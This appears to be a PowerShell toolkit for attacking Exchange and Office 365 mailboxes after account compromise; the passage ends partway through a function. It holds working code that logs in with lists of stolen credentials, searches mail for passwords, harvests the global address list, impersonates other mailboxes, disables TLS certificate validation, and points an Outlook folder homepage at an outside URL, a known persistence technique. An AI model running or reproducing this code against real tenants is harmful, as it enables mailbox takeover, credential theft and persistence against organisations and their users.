function Get-MailInfo {

    <#
    .SYNOPSIS
    
        A PowerShell function to list all mail folders including their size in MB using EWS Managed API 2.2
        
    .DESCRIPTION
    
        A PowerShell function to list all the folders including their size in MB using EWS Managed API 2.2.
        To know about EWS Managed API check references section
        
    .PARAMETER Email
    
        Email Address 
    
    .PARAMETER Password
    
        Account password.

     .PARAMETER ExchangeServHostname
    
        Exchange server hostname or IP address, by default is set to "outlook.office365.com"

     .PARAMETER Accounts-FileName

        A Dictionary of compromised users including their password.
        A Delimiter separating the username and the password can be specified using the -Delimiter switch, Semi-colon ";" will be used as a default delimter.
        CSV Example: (headers must be specified (aka "Email":"Password").

        "Email";"Password"
        "User1@0x2e.onmicrosoft.com";"P2ssw31rd"
        "User2@0x2e.onmicrosoft.com";"P2ssw31rd2"
        "support@0x2e.onmicrosoft.com";"s3cr3tP244"

    .PARAMETER Delimiter
    
        Delimiter separating each row of credentials available on compromized accounts CSV file specified by -Accounts-FileName switch.
        
    .PARAMETER CSVExport
    
        If Set, a csv file containing the results will be generated. format: {timestamp}-output.csv
        
    .EXAMPLE
 
        PS C:\> Get-MailInfo -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd

        List all Folders using the supplied credentials



        PS C:\> Get-MailInfo -ExchangeServHostname xcorp.outlook.com -Email 'admin@xcorp.com' -Password P@ssw0rd

        List all Folders using the supplied credentials & EWS Authentication is performed against "xcorp.outlook.com" Exchange server


        
        PS C:\> Get-MailInfo -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd -CSVExport

        List all Folders using the supplied credentials and export the output to a csv file.



        PS C:\> Get-MailInfo -AccountsFileName 'C:\Users\med\Desktop\Powershell Scripts\ToShare\users.csv' -Delimiter '|'

        List all users folders using the list of credentials available on the CSV file "users.csv", the -Delimiter is used for valid email|password extraction.
        Results: Data size statistics per user.


        
        PS C:\> Get-MailInfo -AccountsFileName 'C:\Users\med\Desktop\Powershell Scripts\ToShare\users.csv' -Delimiter '|' -CSVExport

        List all users folders using the list of credentials available on the CSV file "users.csv", the -Delimiter is used for valid username|password extraction.
        The final output will exported to CSV.



        PS C:\> Get-MailInfo -AccountsFileName 'C:\Users\med\Desktop\Powershell Scripts\ToShare\users.csv' -Delimiter '|' -GenerateChart

        Generate 2 (two) charts for now (more to come);
            Chart 1: Percentage of compromized accounts
            Chart 2: Compromized Data Size Percentage
        
        
    .NOTES
    
        Sample script created by; @med0x2e
    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$False)]
        [string]
        $Email="",

        [Parameter(Mandatory=$False)]
        [string]
        $Password="",

        [Parameter(Mandatory=$False)]
        [string]
        $ExchangeServHostname="outlook.office365.com",

        [Parameter(Mandatory=$False)]
        [string]
        $AccountsFileName="",

        [Parameter(Mandatory=$False)]
        [string]
        $Delimiter=";",

        [Parameter(Mandatory=$False)]
        [switch]$CSVExport,
        
        [Parameter(Mandatory=$False)]
        [switch]$GenerateChart      
        
    )

    try{
          
        if(!$PSBoundParameters.ContainsKey('Email') -and !$PSBoundParameters.ContainsKey('Password') -and !$PSBoundParameters.ContainsKey('AccountsFileName')) {
            Get-Help $MyInvocation.MyCommand
            return
        }

        Add-Type -Path "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"

        $EWS = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(`
                         [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013_SP1)

        $EWS.UseDefaultCredentials = $false

        $isMulti = $PSBoundParameters.ContainsKey('AccountsFileName')
        $usersCount = 0
        $userAccounts = @()

        if($isMulti){
            Write-Host "[+]: Extracting Users from $AccountsFileName " -ForegroundColor DarkYellow
            $isDelimiterSpecified = $PSBoundParameters.ContainsKey('Delimiter')

            if($isDelimiterSpecified){
                Write-Host "[+]: Importing CSV file using $Delimiter as a Delimiter " -ForegroundColor DarkYellow
                $userAccounts = import-csv -Delimiter $Delimiter $AccountsFileName
            }else{
                 Write-Host "[+]: No Delimiter specified, importing CSV file using default delimiter ';' " -ForegroundColor DarkYellow
                 $userAccounts = import-csv -Delimiter ';' $AccountsFileName
            }

            $m = $userAccounts | measure
            $usersCount = $userAccounts.count
            Write-Host "[+]: $usersCount imported accounts " -ForegroundColor DarkYellow
            
        }else{
            $isEmailAndPwdSpecified = ($PSBoundParameters.ContainsKey('Email') -and $PSBoundParameters.ContainsKey('Password'))

            if($isEmailAndPwdSpecified){
                $userAccount = New-Object -TypeName PSOBJECT
                $userAccount | Add-Member -Name 'Email' -MemberType Noteproperty -Value $Email
                $userAccount | Add-Member -Name 'Password' -MemberType Noteproperty -Value $Password
                $userAccounts += $userAccount
            }else{     
                Get-Help $MyInvocation.MyCommand
                return
            }


        }

        Write-Host "-----------------------------------------------------"

        if(!($usersCount -eq 0)){
           if(!([bool]($userAccounts[0].PSobject.Properties.name -eq "Email"))){
                Write-Host "[-]: If you're using -AccountsFileName option, make sure to specify the -Delimiter option or use the ';' as a Delimiter on the users CSV file"
                return
           }
        }


        $EWS.Url = "https://" + $ExchangeServHostname + "/EWS/Exchange.asmx"
        $fObjects = @()
        $totalSize = 0

        ForEach($account in $userAccounts){
            
            Write-Host "[+]: Authenticating using "$account.Email -ForegroundColor DarkYellow
            
            $EWS.Credentials = New-Object System.Net.NetworkCredential($account.Email,$account.Password)   

            $rootFolderid= new-object Microsoft.Exchange.WebServices.Data.FolderId(`
                                [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot)  
            $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($EWS,$rootFolderid)
            Write-Host "[+]: Successfully authenticated as" $account.Email -ForegroundColor Green
        
            $psPropertySet = new-object Microsoft.Exchange.WebServices.Data.PropertySet(`
                                       [Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)  
            $PR_MESSAGE_SIZE_EXTENDED = new-object Microsoft.Exchange.WebServices.Data.ExtendedPropertyDefinition(3592,`
                                            [Microsoft.Exchange.WebServices.Data.MapiPropertyType]::Long)
            $PR_DELETED_MESSAGE_SIZE_EXTENDED = new-object Microsoft.Exchange.WebServices.Data.ExtendedPropertyDefinition(26267,`
                                                    [Microsoft.Exchange.WebServices.Data.MapiPropertyType]::Long)  
            
            
            $psPropertySet.Add($PR_MESSAGE_SIZE_EXTENDED);  
        
            $folderView=[Microsoft.Exchange.WebServices.Data.FolderView]100
            $folderView.Traversal='Deep'
            $folderView.PropertySet = $psPropertySet  
            $rootFolder.Load()

            $folders = $rootFolder.FindFolders($folderView)
            Write-Host "[+]: Retrieving/Calculating Mailboxes statistics" -ForegroundColor DarkYellow
            Start-Sleep -s 3
            $userFolderTotalSize = 0

            $fObjects += foreach ($folder in $folders){
                if($folder.ChildFolderCount -gt 0){
                    $FolderSize = $null;  
                    $FolderSizeValue = 0  
 
                    if ($folder.TryGetProperty($PR_MESSAGE_SIZE_EXTENDED,[ref] $FolderSize)){   
                        $FolderSizeValue = [Int64]$FolderSize
                        $totalSize += $FolderSizeValue
                        $userFolderTotalSize += $FolderSizeValue

                    }

                    $fObjectProperties = @{
                        User = $account.Email
                        Name = $folder.DisplayName
                        ItemsCount     = ($folder.ChildFolderCount + $folder.TotalCount) - 1
                        Size  = "{0:N2}" -f($FolderSizeValue/1mb) + " (MB)"
                        New     = $folder.IsNew
                        UnreadCount = $folder.UnReadCount
                    }

                    New-Object psobject -Property $fObjectProperties 
               
                }  
            }

            $fObjects | ForEach-Object { if(!([bool]($_.PSobject.Properties.name -match "SubTotal")))`
            { $_ | Add-Member -Name "SubTotal"  -MemberType Noteproperty -Value ("{0:N2}" -f($userFolderTotalSize/1mb))}}
            $userFolderTotalSize = 0
            
        }

        $rootPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\')

        if($CSVExport){
            $filename = $(get-date -f MM-dd-yyyy_HH_mm_ss)
            $fObjects | Export-Csv –NoTypeInformation -Delimiter "|" -Path $rootPath"\Output-$(get-date -f MM-dd-yyyy_HH_mm_ss).csv" 
            Write-Host "`n[+]: Check Results on: $rootPath\Output-$filename.csv `r`n" -ForegroundColor Green

        }else{
            Write-Host "`n[+]: Results: " -ForegroundColor Green
            $fObjects |  Sort-Object User -Descending | Format-Table -AutoSize -GroupBy `
             @{Name=" User"; e={$_.User + "`n`tUser Data Size: " + $_.SubTotal + " (MB)"}}`
              -Property Name, @{Name="Items Count"; e={$_.ItemsCount}}, @{Name="Unread Count"; e={$_.UnreadCount}}, `
              Size, @{Name="New/Old"; e={if($_.New){"New Folder"}else{"Old Folder"}}}
            Write-Host "`r`n"
        }

        Write-Host "Total Size:" ("{0:N2}" -f($totalSize/1mb)) "(MB) `r`n" -ForegroundColor Green

        if($PSBoundParameters.ContainsKey('GenerateChart')){
               #First Chart: Compromised number of users out of the total number of users (pie chart) (total number of users = can be retrieved using Get-GlobalAddressList)
               Write-Host "[+] Retrieving the GAL total number of users. This might take a while (10 to 15 minutes)...`r`n" -ForegroundColor DarkYellow
               
               $GALList = Get-GlobalAddressList -EWS $EWS
               $GALList = $GALList | Sort-Object | Get-Unique #| sls -n "<SMTP"


               $_chartObjectA = New-Object -TypeName PSObject
               $_chartObjectA | Add-Member -Name "Alias"  -MemberType Noteproperty -Value "Total Users Count"
               $_chartObjectA | Add-Member -Name "Value"  -MemberType Noteproperty -Value $GALList.count
               $_chartObjectB = New-Object -TypeName PSObject
               $_chartObjectB | Add-Member -Name "Alias"  -MemberType Noteproperty -Value "Compromized Users Count"
               $_chartObjectB | Add-Member -Name "Value"  -MemberType Noteproperty -Value $usersCount

               $_cObjects =@()
               $_cObjects += $_chartObjectA 
               $_cObjects += $_chartObjectB 

               Import-Module $rootPath'\dependencies\lib\PoshCharts.psm1'

               $_cObjects | Out-PieChart -XField "Alias" -YField "Value" -Title 'Percentage of compromized users'`
                       -IncludeLegend -ToFile $rootPath"\Charts\percentage-of-compromized-users.png"
               
               Write-Host "[+]: First Chart $rootPath\Charts\percentage-of-compromized-users.png generated `r`n" -ForegroundColor Green


               #Second Chart: Data that could ve been exfiltrated based on users's data file size average. (pie chart)
               
               #Calculate data size average per user based on the total data size for compromized users => this is an approximate calculation and not precisely the exact value.
               $userDataSizeAverage = $totalSize/$usersCount 

               #Total data size corresponding to all users.
               $totalDataSizeAverage = $userDataSizeAverage * $GALList.count

               $_chartObjectA = New-Object -TypeName PSObject
               $_chartObjectA | Add-Member -Name "Alias"  -MemberType Noteproperty -Value "Total Data Size (MB)"
               $_chartObjectA | Add-Member -Name "Value"  -MemberType Noteproperty -Value ("{0:N2}" -f($totalDataSizeAverage/1mb))
               $_chartObjectB = New-Object -TypeName PSObject
               $_chartObjectB | Add-Member -Name "Alias"  -MemberType Noteproperty -Value "Exfiltrated Data (MB)"
               $_chartObjectB | Add-Member -Name "Value"  -MemberType Noteproperty -Value ("{0:N2}" -f($totalSize/1mb))

               
               $_cObjects =@()
               $_cObjects += $_chartObjectA 
               $_cObjects += $_chartObjectB 

               $_cObjects | Out-PieChart -XField "Alias" -YField "Value" -Title 'Compromized Data Percentage'`
                       -IncludeLegend -ToFile $rootPath"\Charts\compromized-data-percentage.png"

               Write-Host "[+]: Second Chart $rootPath\Charts\compromized-data-percentage.png generated `r`n" -ForegroundColor Green

               #Third Chart: Mail data size per domain (bar chart)

               #Domains with most compromized accounts(bar chart)

               #More charts to come

         }

         Write-Host "[+]: Done" -ForegroundColor DarkYellow
    }
    
    catch {
        $_.Exception.Message
    }

}


function Invoke-MailEnum {

    <#
    .SYNOPSIS
    
        A PowerShell function to search/lookup a specific number of emails for common keywords "credentials, passwords, ..etc" using EWS Managed API 2.2
        
    .DESCRIPTION
    
        A PowerShell function to search/lookup a specific number of emails for common keywords "credentials, passwords, ..etc" using EWS Managed API 2.2
        To know about EWS Managed API check references section

     .PARAMETER Email
    
        Email Address 
    
    .PARAMETER Password
    
        Account password.
        
    .PARAMETER Depth
    
        Represents number of emails to check against a common string/keyword 
    
    .PARAMETER Keyword
    
        Keyword to use for filtering emails.

    .PARAMETER CSVExport
    
        If Set, a csv file containing the results will be generated. format: {timestamp}-output.csv
        
    .EXAMPLE
    
 
        PS C:\> Invoke-MailEnum -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd

        List mail content for a specific account by iterating through the top 100 mailbox item and using a default keyword set to filter emails based on "credentials", "username", "password"
        


        PS C:\> Invoke-MailEnum -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd -Depth 150

        List mail content for a specific account by iterating through the top 150 mailbox item and using a default keyword set to filter emails based on "credentials", "username", "password"
        


        PS C:\> Invoke-MailEnum -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd -Depth 150 -Keyword secret

        List mail content for a specific account by iterating through the top 150 mailbox item and using "secret" as a keyword for emails filtering.
               


        PS C:\> Invoke-MailEnum -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd -CSVExport

        List mail content for a specific account by iterating through the top 100 mailbox item and using a default keyword set to filter emails based on "credentials", "username", "password"
        & Export to CSV


        
    .NOTES
    
        Sample script created by; @med0x2e
    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, Position=1)]
        [string]
        $Email=$(throw "-Username is required."),
        [Parameter(Mandatory=$True, Position=2)]
        [string]
        $Password=$( Read-Host -asSecureString "Input password" ),
        [Parameter(Mandatory=$False, Position=3)]
        [Int64]
        $Depth=100,
        [Parameter(Mandatory=$False, Position=4)]
        [string]
        $Keyword="Credentials",
        [Parameter(Mandatory=$False, Position=5)]
        [switch]$CSVExport   
        
    )


    try{

        if(!$PSBoundParameters.ContainsKey('Email') -and !$PSBoundParameters.ContainsKey('Password')){
            Get-Help $MyInvocation.MyCommand
        }

        Add-Type -Path "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"

        $EWS = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(`
                         [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013_SP1)

        $EWS.UseDefaultCredentials = $false

        $EWS.Url = "https://outlook.office365.com/EWS/Exchange.asmx"
        $EWS.Credentials = New-Object System.Net.NetworkCredential($Email,$Password)   

        $inboxFolderid= new-object Microsoft.Exchange.WebServices.Data.FolderId(`
                            [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox)  
        $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($EWS,$inboxFolderid)

        $itemView = New-Object Microsoft.Exchange.WebServices.Data.ItemView($Depth)
        
        $mailItems = $Inbox.FindItems($itemView)

        $psPropertySet = new-object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
        $psPropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text

        #set colours for Write-Color output
        $colorsread = "Green"
        $colorsunread = "DarkCyan"

        # output unread count
        Write-Host "Unread count: ",$inbox.UnreadCount -ForegroundColor $colorsread
        Write-Host "`n"
        Write-Host "Emails containing '$Keyword' : "

        foreach ($item in $mailitems.Items)
        {
          # load the property set to allow us to get to the body
          $item.load($psPropertySet)

          # colour our output
          If ($item.IsRead) { $colors = $colorsread } Else { $colors = $colorsunread }
          
              If($Keyword.Trim().Length -eq 0){

                  If ($item.Body.Text -like "*Credentials*" -Or $item.Body.Text -like "*Username*" -Or $item.Body.Text -like "*Password*"){
                      Out-EmailContent $item $colors
                  }
              }else{     
                  If ($item.Body.Text -like "*$Keyword*"){
                        Out-EmailContent $item $colors
                  }
              }
          
          }

       
     
    }
    
    catch {
        $_.Exception.Message
    }

}


function Out-EmailContent{

    param(
        [Microsoft.Exchange.WebServices.Data.Item]
        $emailItem,
        [string]
        $colors

    )

    $body = $emailItem.Body.Text -replace '\s+', ' '
    $bodyCutOff = (150,$body.Length | Measure-Object -Minimum).Minimum
    $body = $body.Substring(0,$bodyCutOff)
    $body = "$body..."

    write-host "====================================================================" -foregroundcolor Black
    Write-host "From:    ",$($emailItem.From.Name) -ForegroundColor $colors
    Write-host "Subject: ",$($emailItem.Subject)   -ForegroundColor $colors
    Write-host "Body:    ",$($body)            -ForegroundColor $colors
    write-host "====================================================================" -foregroundcolor Black
    ""
}


function Get-GlobalAddressList{
    
    <#
    .SYNOPSIS
    
        A PowerShell function to extract the global address list using EWS Managed API 2.2
        
    .DESCRIPTION
    
        A PowerShell function to extract the global address list using EWS Managed API 2.2.
        To know about EWS Managed API check references section
        
    .PARAMETER Email
    
        Email Address 
    
    .PARAMETER Password
    
        Account password.

     .PARAMETER ExchangeServHostname
    
        Exchange server hostname or IP address, by default is set to "outlook.office365.com"

        
    .PARAMETER CSVExport
    
        If Set, a csv file containing the results will be generated. format: {timestamp}-output.csv
        
    .EXAMPLE
 
        PS C:\> Get-GlobalAddressList -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd

        List Global Address List



        PS C:\> Get-GlobalAddressList -ExchangeServHostname xcorp.outlook.com -Email 'admin@xcorp.com' -Password P@ssw0rd

        List Global Address List & EWS Authentication is performed against "xcorp.outlook.com" Exchange server


        
        PS C:\> Get-GlobalAddressList -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd -CSVExport

        List Global Address List using the supplied credentials and export the output to a csv file.
        
    .NOTES
    
        Sample script created by; @med0x2e
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$False)]
        [Microsoft.Exchange.WebServices.Data.ExchangeService]
        $EWS,

        [Parameter(Mandatory=$False)]
        [string]
        $Email,

        [Parameter(Mandatory=$False)]
        [string]
        $Password="",

        [Parameter(Mandatory=$False)]
        [string]
        $ExchangeServHostname="outlook.office365.com",

        [Parameter(Mandatory=$False)]
        [switch]$CSVExport
     )

     
     Add-Type -Path "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"

     if($EWS -eq $null){
        
        if(!$PSBoundParameters.ContainsKey('Email') -or !$PSBoundParameters.ContainsKey('Password')) {
            Get-Help $MyInvocation.MyCommand
            return

        }else{

            $EWS = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(`
                         [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013_SP1)

            $EWS.UseDefaultCredentials = $false

            $EWS.Url = "https://" + $ExchangeServHostname + "/EWS/Exchange.asmx"

            Write-Host "[+]: Authenticating using "$Email -ForegroundColor DarkYellow
            
            $EWS.Credentials = New-Object System.Net.NetworkCredential($Email,$Password)   

            $rootFolderid= new-object Microsoft.Exchange.WebServices.Data.FolderId(`
                                [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot)  
            $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($EWS,$rootFolderid)

            Write-Host "[+]: Successfully authenticated as" $Email -ForegroundColor Green

            Start-Sleep -Seconds 2

             Write-Host "[+] Retrieving the GAL total number of users. This might take a while (10 to 15 minutes)...`r`n" -ForegroundColor DarkYellow
        }

     }

     

     $Letters = @()
     65..90 | foreach-object { $Letters += [char]$_ }

     $twoLettersCombinations = @()
   
     #Creating an array of two letter variables AA to ZZ
     Foreach ($letter in $Letters)
     {
        $Letters | foreach-object{$twoLettersCombinations += ($letter + $_)}
     }

     #The ResolveName function only will return a max of 100 results from the Global Address List. So we search two letter combinations to try and retrieve as many as possible.
     #$oneLetterCombinations = @('a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z')
     $GlobalAddressList = @()
     $counter = $twoLettersCombinations.count
     foreach($lcombination in $twoLettersCombinations)
     {
        $counter = ($counter -1)

        Write-Progress -Activity "$counter Email Search/Lookup Combination Left"


        $GALresults = $EWS.ResolveName($lcombination)

        foreach($item in $GALresults)
        {
            #Write-Output $item.Mailbox.Address
            $GlobalAddressList += $item.Mailbox
        }

     }
     
     if($PSBoundParameters.ContainsKey('Email') -and $PSBoundParameters.ContainsKey('Password')){

         $rootPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\')

        if($CSVExport){
            $filename = $(get-date -f MM-dd-yyyy_HH_mm_ss)
            $GlobalAddressList | Sort-Object | Get-Unique | Export-Csv –NoTypeInformation -Delimiter "|" -Path $rootPath"\GAL-$(get-date -f MM-dd-yyyy_HH_mm_ss).csv" 
            Write-Host "`n[+]: Check GAL Results on: $rootPath\GAL-$filename.csv `r`n" -ForegroundColor Green

        }else{

            Write-Host "`n[+]: Results: " -ForegroundColor Green
            $GlobalAddressList | Sort-Object | Get-Unique| Format-Table -Wrap -Property Name, Address
            Write-Host "`r`n"
        }
     }
     
     if($PSBoundParameters.ContainsKey('EWS')){
        return $GlobalAddressList
     }

}


function Invoke-ImpersonatedAuth{

   <#
    .SYNOPSIS
    
        A PowerShell function for impersonating other mailboxes using EWS Managed API 2.2
        
    .DESCRIPTION
    
        A PowerShell function for impersonating other mailboxes using EWS Managed API 2.2.
        To know about EWS Managed API check references section
        
    .PARAMETER Email
    
        Email Address 
    
    .PARAMETER Password
    
        Account password.

     .PARAMETER ExchangeServHostname
    
        Exchange server hostname or IP address, by default is set to "outlook.office365.com"

        
    .PARAMETER impersonatedMailbox
    
        Mailbox to impersonate
        
    .EXAMPLE
 
        PS C:\> Invoke-ImpersonatedAuth -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd -impersonatedMailbox test@contoso.onmicrosoft.com

        Impersonate a sepcific mailbox



        PS C:\> Invoke-ImpersonatedAuth -ExchangeServHostname xcorp.outlook.com -Email 'admin@xcorp.com' -Password P@ssw0rd -impersonatedMailbox test@contoso.onmicrosoft.com
        
        Impersonate a sepcific mailbox & EWS Authentication is performed against "xcorp.outlook.com" Exchange server
        
        
    .NOTES
    
        Sample script created by; @med0x2e
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$False)]
        [string]
        $Email,

        [Parameter(Mandatory=$False)]
        [string]
        $Password="",

        [Parameter(Mandatory=$False)]
        [string]
        $ExchangeServHostname="outlook.office365.com",

        [Parameter(Mandatory=$False)]
        [string]
        $impersonatedMailbox

     )

    if(!$PSBoundParameters.ContainsKey('Email') -or !$PSBoundParameters.ContainsKey('Password') -or !$PSBoundParameters.ContainsKey('impersonatedMailbox')){
            Get-Help $MyInvocation.MyCommand
            return

    }

    Import-Module "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"

    $ExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013

    $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ExchangeVersion)

    $Creds = New-Object System.Net.NetworkCredential($Email, $Password)

    $service.Credentials = $creds

    $service.Url = "https://"+$ExchangeServHostname+"/EWS/Exchange.asmx"


    Write-Host "Using $Email to Impersonate $impersonatedMailbox `r`n" -ForegroundColor DarkYellow

    $service.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId([Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress,$impersonatedMailbox );


    $InboxFolder= new-object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$impersonatedMailbox) #$ImpersonatedMailboxName

    $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$InboxFolder)

    Write-Host "Results: `r`n" -ForegroundColor Green
    Write-Host "Total Item count for Inbox: " $Inbox.TotalCount -ForegroundColor DarkYellow

    Write-Host 'Total Items Unread:' $Inbox.UnreadCount -ForegroundColor DarkYellow

}


function Set-HomePage{

  <#
    .SYNOPSIS
    
        A PowerShell function for setting a specific folder homepage beloging to an outlook account using EWS Managed API 2.2
        
    .DESCRIPTION
    
        A PowerShell function for setting a specific folder homepage beloging to an outlook account using EWS Managed API 2.2
        To know about EWS Managed API check references section
        
    .PARAMETER Email
    
        Email Address 
    
    .PARAMETER Password
    
        Account password.

     .PARAMETER ExchangeServHostname
    
        Exchange server hostname or IP address, by default is set to "outlook.office365.com"
        
    .PARAMETER HomePage
    
        New Home Page to be set for the user.

                
    .PARAMETER TargetFolder
    
        Folder to set the home page for use Get-xMailInfo function to list users basic statistics/folders, by default -TargetFolder is set "Inbox"
        
    .EXAMPLE
 
        PS C:\> Set-HomePage -Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd -HomePage 'https://categorized-domain.com/index.html' -TargetFolder 'Inbox'

        Setting the home page for 'admin@contoso.onmicrosoft.com' to 'https://categorized-domain.com/index.html'



        PS C:\> Set-HomePage -ExchangeServHostname 'mail.xcorp.com' Email 'admin@contoso.onmicrosoft.com' -Password P@ssw0rd -TargetFolder 'Inbox' -HomePage 'https://categorized-domain.com/index.html'
        
        Setting the home page for 'admin@contoso.onmicrosoft.com' to 'https://categorized-domain.com/index.html' & using 'mail.xcorp.com' as exchange server.
        
    .NOTES
    
        Sample script created by; @med0x2e
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [string]
        $Email=$(throw "-Email is required."),

        [Parameter(Mandatory=$True)]
        [string]
        $Password=$(Read-Host -asSecureString "Password" ),

        [Parameter(Mandatory=$False)]
        [string]
        $ExchangeServHostname="outlook.office365.com",

        [Parameter(Mandatory=$True)]
        [string]
        $HomePage,

        [Parameter(Mandatory=$False)]
        [string]
        $TargetFolder="Inbox"
     )

    if(!$PSBoundParameters.ContainsKey('Email') -or !$PSBoundParameters.ContainsKey('Password') -or !$PSBoundParameters.ContainsKey('HomePage')){
            Get-Help $MyInvocation.MyCommand
            return

    }

    Add-Type -Path "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"

    $EWS = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService([Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2016_SP1)

    $EWS.UseDefaultCredentials = $false

    Write-Host "[+]: Authenticating using "$Email -ForegroundColor DarkYellow

    $EWS.Url = "https://"+$ExchangeServHostname+"/EWS/Exchange.asmx"
    $EWS.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)   

    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates  
  
    ## Code From http://poshcode.org/624
    ## Create a compilation environment
    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
    $Compiler=$Provider.CreateCompiler()
    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
    $Params.GenerateExecutable=$False
    $Params.GenerateInMemory=$True
    $Params.IncludeDebugInformation=$False
    $Params.ReferencedAssemblies.Add("System.DLL") | Out-Null

    $TASource=@'
        namespace Local.ToolkitExtensions.Net.CertificatePolicy{
        public class TrustAll : System.Net.ICertificatePolicy {
            public TrustAll() { 
            }
            public bool CheckValidationResult(System.Net.ServicePoint sp,
            System.Security.Cryptography.X509Certificates.X509Certificate cert, 
            System.Net.WebRequest req, int problem) {
            return true;
            }
        }
        }
'@ 
    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
    $TAAssembly=$TAResults.CompiledAssembly

    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

    ## end code from http://poshcode.org/624

    ## Ecnoding Homepage URL
    function GetHomepageValue($ipInputString){
	    $hsHomePageChar = $ipInputString.ToCharArray();
	    foreach ($element in $hsHomePageChar) {$hsHomepagehex = $hsHomepagehex + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element)) + "00"}
	    $dwVersion = "02"
            $dwType = "00000001"
            $dwFlags = "00000001";
            $dwUnused = "00000000000000000000000000000000000000000000000000000000";
            $cbDataSize = (($hsHomepagehex.Length / 2) + 2).ToString("X");
            $propval = $dwVersion + $dwType + $dwFlags + $dwUnused + "000000" + $cbDataSize + "000000" + $hsHomepagehex + "000000"
	    return $propval

    }

    function HexStringToByteArray($HexString)
    {
	    $ByteArray =  New-Object Byte[] ($HexString.Length/2);
  	    for ($i = 0; $i -lt $HexString.Length; $i += 2)
	    {
		     $ByteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
	    } 
 	    Return @(,$ByteArray)

    }

    $PR_FOLDER_WEBVIEWINFO =  new-object Microsoft.Exchange.WebServices.Data.ExtendedPropertyDefinition(14047,[Microsoft.Exchange.WebServices.Data.MapiPropertyType]::Binary)


    $rootFolderid= new-object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot)  
    $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($EWS,$rootFolderid)
    Write-Host "[+]: Successfully authenticated as" $Email -ForegroundColor Green
    
    Start-Sleep -Seconds 2

    $fv=[Microsoft.Exchange.WebServices.Data.FolderView]1000
    $fv.Traversal='Deep'
       
    Write-Host "[+]: Retrieving $Email current home page ..." -ForegroundColor DarkYellow
    Write-Host "`r`n"
    Start-Sleep -s 2

    $psPropertySet = new-object Microsoft.Exchange.WebServices.Data.PropertySet(`
                                           [Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)  

    $psPropertySet.Add($PR_FOLDER_WEBVIEWINFO);
    $fv.PropertySet = $psPropertySet 
    $rootFolder.Load()
    $folders = $rootFolder.FindFolders($fv)

    foreach ($folder in $folders){
    
        $folderHomePage = $null;  
        $folderHomePageValue = 0  

        if( $folder.DisplayName -eq $TargetFolder ){

                 if ($folder.TryGetProperty($PR_FOLDER_WEBVIEWINFO,[ref] $folderHomePage)){   
                            $folderHomePageValue = ($folderHomePage|ForEach-Object ToString X2) -join '' -replace '00',''
